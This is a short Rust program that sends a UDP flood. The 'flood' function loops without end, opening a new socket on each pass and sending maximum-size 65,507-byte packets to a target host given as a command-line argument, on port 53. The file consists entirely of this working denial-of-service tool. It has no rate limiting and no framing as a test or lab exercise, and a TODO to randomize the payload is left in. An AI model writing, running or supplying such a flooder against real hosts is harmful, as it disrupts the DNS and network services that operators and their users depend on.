use std::net::UdpSocket;
use std::env;

// const ADDR: String = "localhost";
const PORT: u32 = 53;
const NB_THREADS: u32 = 1;

fn flood(addr: String, port: u32) {
    loop {
        let src = format!("{}:{}", addr, port);
        let buf = [0; 65507]; // TODO RANDOMIZE
        let socket = UdpSocket::bind("0.0.0.0:0").unwrap();

        socket.send_to(&buf, &src).unwrap();
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();

    println!("{:?}", args);
    flood(args[1].to_string(), PORT);
}
